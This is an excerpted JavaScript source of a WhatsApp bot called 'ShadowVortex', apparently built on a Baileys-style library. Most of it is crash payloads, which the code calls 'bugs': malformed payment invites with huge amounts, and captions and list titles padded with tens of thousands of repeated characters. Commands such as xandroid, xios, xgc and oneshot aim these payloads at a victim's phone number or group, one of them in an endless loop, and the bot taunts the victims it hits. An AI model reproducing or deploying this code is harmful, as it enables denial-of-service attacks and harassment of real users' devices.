...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"INR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"MΞX-GΔMΞCØDΞR⛧ MΞX-GΔMΞCØDΞR⛧ MΞX-GΔMΞCØDΞR⛧\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
{
"name": "review_and_pay",
"buttonParamsJson": `{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"✳️🤫 ShadowVortex⭑ MΞX-GΔMΞCØDΞR⛧ # 𝙴𝚣𝙲𝚛𝚊𝚜𝚑ཀ͜͡✅⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}`
}
]
}
}
...
message: {
  "liveLocationMessage": {
    "degreesLatitude": "p",
    "degreesLongitude": "p",
    "caption": `MΞX-GΔMΞCØDΞR⛧ MΞX-GΔMΞCØDΞR⛧ MΞX-GΔMΞCØDΞR⛧ MΞX-GΔMΞCØDΞR⛧ MΞX-GΔMΞCØDΞR⛧ MΞX-GΔMΞCØDΞR⛧ MΞX-GΔMΞCØDΞR⛧`+"ꦾ".repeat(50000),
    "sequenceNumber": "0",
    "jpegThumbnail": ""
     }
  }
 ...
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
    interactiveMessage: {
      header: {
        title: "MΞX-GΔMΞCØDΞR⛧",
        hasMediaAttachment: true,
        ...(await prepareWAMessageMedia({ image: { url: "https://i.ibb.co/t8sHrhb/IMG-20241218-WA0144.jpg" } }, { upload: GlobalTechInc.waUploadToServer }))
      },
      body: {
        text: ""
      },
...
async function listxeonfck(target, kuwoted) {
 var etc = generateWAMessageFromContent(target, proto.Message.fromObject({
  'listMessage': {
    'title': "MΞX-GΔMΞCØDΞR⛧"+" ".repeat(920000),
        'footerText': `MΞX-GΔMΞCØDΞR⛧ MΞX-GΔMΞCØDΞR⛧ MΞX-GΔMΞCØDΞR⛧ MΞX-GΔMΞCØDΞR⛧ MΞX-GΔMΞCØDΞR⛧ MΞX-GΔMΞCØDΞR⛧ MΞX-GΔMΞCØDΞR⛧`,
        'description': `MΞX-GΔMΞCØDΞR⛧ MΞX-GΔMΞCØDΞR⛧ MΞX-GΔMΞCØDΞR⛧ MΞX-GΔMΞCØDΞR⛧ MΞX-GΔMΞCØDΞR⛧ MΞX-GΔMΞCØDΞR⛧ MΞX-GΔMΞCØDΞR⛧`,
        'buttonText': null,
        'listType': 2,
        'productListInfo': {
          'productSections': [{
                    ...
                    GlobalTechInc.sendMessage(i, {
                        ...
                        contextInfo: {
                            externalAdReply: {
                                ...
                                thumbnailUrl: 'https://i.ibb.co/t8sHrhb/IMG-20241218-WA0144.jpg',
...
`.trim()
                ...
                GlobalTechInc.sendMessage(m.chat, {
                    ...
                    contextInfo: {
                        externalAdReply: {
                            showAdAttribution: true,
                            title: `${botname}`,
                            body: `SCRIPT OF ${botname} is on YouTube @mxgamecoder`,
                            thumbnailUrl: 'https://i.ibb.co/t8sHrhb/IMG-20241218-WA0144.jpg',
                            sourceUrl: global.link,
                            mediaType: 1,
                            renderLargerThumbnail: true
            ...
            case 'support':
            case 'donasi':
                let textnate = `Hello Brother, 👿 ${pushname} 👿\n\nMY NAME IS MX-GΔMΞCØDΞR PLEASE SUPPORT ME IF YOU LIKE AM NOT BEGGING YOU AM COMMANDING YOU 👿`
                GlobalTechInc.sendMessage(m.chat, {
                    text: 'WHATSAPP CHANNEL: https://whatsapp.com/channel/0029Vavz0e6E50Ugp30Z6z0W\n\n' + textnate
                }, {
                    quoted: m
                })
                break
...
break
            ...
            break
            case 'listimage': {
                let teks = '┌──⭓「 *ShadowVortex Image List* 」\n│\n'
            ...
            break
            case 'listvideo': {
                let teks = '┌──⭓「 *ShadowVortex Video List* 」\n│\n'
...
case 'listzip': {
await loading()
let teksooooo = '┌──⭓「 *ShadowVortex ZIP LIST* 」\n│\n'
...
case 'listapk': {
await loading()
let teksoooooo = '┌──⭓「 *ShadowVortex APK LIST* 」\n│\n'
...
case 'listpdf': {
await loading()
let teksoooo = '┌──⭓「 *ShadowVortex PDF LIST* 」\n│\n'
...
case "xandroid": {
  ...
  if (cleanedNumber == "2349021506036") {
    return;
  }
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp moron you kill my vibes");
  }
  replyglobal("please wait, " + command + " bug is in process fear my return..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendVariousMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "ShadowVortex successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nRight now he is calling 🤣\n\nPause 2 minutes so that the bot is not banned 🚫, i warn you oooooo.", 
    [whatsappNumber]
  );
}
break;
case "xios": {
  ...
  if (isNaN(parseInt(amount))) {
    return replyglobal("Amount must be a number, be fast");
  }
  let cleanedNumber = number.replace(/[^0-9]/g, '');
  let encodedAmount = '' + encodeURI(amount);
  var contactInfo = await GlobalTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  ...
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp you kill my vibes again moron");
  }
  replyglobal("please wait, " + command + " bug is in process and don't be too excited..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMultiplePaymentInvites(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nHe is currently regretting messing with you\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
case "xios2":
  {
    ...
    if (isNaN(parseInt(text))) {
      return replyglobal("Amount must be a number gay");
    }
    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
    replyglobal("please wait, " + command + " bug is in process moron..");
  ...
  case "xgc":
  {
    ...
    try {
      ...
      await sleep(2500); // Adjusted sleep time for clarity
      replyglobal("*ShadowVortex IS DONE✅. BUG HAS BEEN SENT TO THE GROUP!.*");
  ...
  replyglobal("please wait, " + command + " bug is in process please calm down..");
  await sleep(2000); // Adjusted sleep time for clarity
  sendMixedMessages(whatsappNumber, encodedAmount);
  await sleep(2500); // Adjusted sleep time for clarity
  sendMessageWithMentions(
    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
    " Using *" + command + "* ✅\n\nHe is currently weeping now\n\nPause 2 minutes so that the bot is not banned.", 
    [whatsappNumber]
  );
}
break;
...
case 'oneshot': {
	if (!isCreator) return replyglobal(mess.owner)
if (!text) return replyglobal(`Usage .${command} 2349021506036`)
let cleanedNumber = text.replace(/[^0-9]/g, '');
if (cleanedNumber.startsWith('0')) return replyglobal(`Example : ${prefix+command} 2349021506036`)
var contactInfo = await GlobalTechInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
  if (cleanedNumber == "2349021506036") {
    return;
  ...
  if (contactInfo.length == 0) {
    return replyglobal("The number is not registered on WhatsApp moron");
  }
					...
					const crasoh = await GlobalTechInc.relayMessage(jid,
						{
							extendedTextMessage: {
								...
								description: '#ShadowVortex ☠️🔥',
								title: '#ShadowVortex ☠️🔥',
								textArgb: 0xff000000,
...
if (!isPremium) return replyglobal(mess.prem)
if (!q) return replyglobal(`Usage .${command} 2349021506036`)
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return replyglobal(`Example : .${command} 2349021506036`)
...
let xeonyvictim = q.replace(/[^0-9]/g, "")
if (xeonyvictim.startsWith('0')) return replyglobal(`Example : .${command} 2349021506036`)
await replyglobal(`In process hahahahhahahah....`)
let target = xeonyvictim + '@s.whatsapp.net'
  for (;;) {
    await aipong(target)
    await sleep(1200)
...
await GlobalTechInc.sendMessage(jid, {
    'document': XeonDoc,
    'fileName': "MΞX-GΔMΞCØDΞR⛧" + xeontext1,
    'mimetype': "application/zip",
    'caption': "MΞX-GΔMΞCØDΞR⛧" + xeontext1,
...
title: `Xeon's ur father`
  ...
  GlobalTechInc.sendMessage(
    chat,
    {
      document: { url: "./settings.js" },
      mimetype: `image/null`,
      fileName: `MΞX-GΔMΞCØDΞR⛧${xeontext11}`,
      caption: `MΞX-GΔMΞCØDΞR⛧ ${xeontext11}`,
    },
...
break
            ...
            case 'shadow':
                let xeonmenuoh = `Hello ${pushname} Welcome, destroy, know pain, am lost what am i doing self, I am ShadowVortex 👿 👿 👿 
╰┈➤ ${xeonytimewisher} 😄
${readmore}
╰┈➤👿 ʙᴜɢ ᴀɴᴅʀᴏɪᴅ 👿
> xandroid 
                    ...
                    GlobalTechInc.sendMessage(m.chat, {
                        ...
                        contextInfo: {
                            externalAdReply: {
                                title: botname,
                                body: ownername,
                                thumbnailUrl: 'https://i.ibb.co/Y7hPrVZ/IMG-20241218-WA0145.jpg',
                                sourceUrl: link,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
